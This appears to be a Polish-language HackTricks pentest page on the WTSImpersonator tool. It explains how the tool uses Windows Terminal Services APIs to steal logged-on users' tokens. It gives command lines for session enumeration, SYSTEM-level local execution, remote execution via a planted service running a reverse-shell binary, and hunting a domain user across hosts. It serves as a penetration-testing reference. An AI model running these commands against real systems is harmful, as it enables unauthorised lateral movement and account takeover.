# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

**WTSImpersonator**, autorstwa Omriego Baso, wykorzystuje API Windows Terminal Services udostępnione przez named pipe RPC `\\pipe\LSM_API_service` do enumeracji zalogowanych sesji i uruchamiania procesu z tokenem wybranego użytkownika. Obsługuje lokalną enumerację i wykonywanie, a także zdalne przepływy pracy oparte na usługach.<sup>[[1]](#references)</sup>

## Główne funkcje

Jego lokalny przepływ wykonywania wykorzystuje następującą sekwencję API:<sup>[[1]](#references)[[2]](#references)</sup>
```text
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
## Moduły i użycie

- **Enumerowanie użytkowników:** Narzędzie może enumerować sesje na lokalnym lub zdalnym hoście.

- Lokalnie:
```bash
.\WTSImpersonator.exe -m enum
```
- Zdalnie, określając adres IP lub nazwę hosta:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Wykonywanie poleceń:** Moduły `exec` i `exec-remote` wymagają kontekstu usługi. Firma Microsoft dokumentuje, że `WTSQueryUserToken` wymaga, aby wywołujący działał jako `LocalSystem` z uprawnieniem `SE_TCB_NAME`.<sup>[[2]](#references)</sup>

- Lokalne wykonywanie poleceń:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec może uruchomić wiersz poleceń `LocalSystem` na potrzeby testów:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Zdalne wykonywanie poleceń:** Tryb zdalny tworzy usługę na celu w przepływie pracy podobnym do PsExec, dlatego wymaga uprawnień do instalowania i uruchamiania tej usługi.<sup>[[1]](#references)</sup>

- Przykład:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Wyszukiwanie użytkowników:** Moduł `user-hunter` przeszukuje listę hostów w poszukiwaniu sesji określonego użytkownika i próbuje wykonać dostarczony program w tym kontekście.<sup>[[1]](#references)</sup>
- Przykład użycia:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## References

- [1] [OmriBaso/WTSImpersonator](https://github.com/OmriBaso/WTSImpersonator)
- [2] [Microsoft: funkcja `WTSQueryUserToken`](https://learn.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsqueryusertoken)
{{#include ../../banners/hacktricks-training.md}}
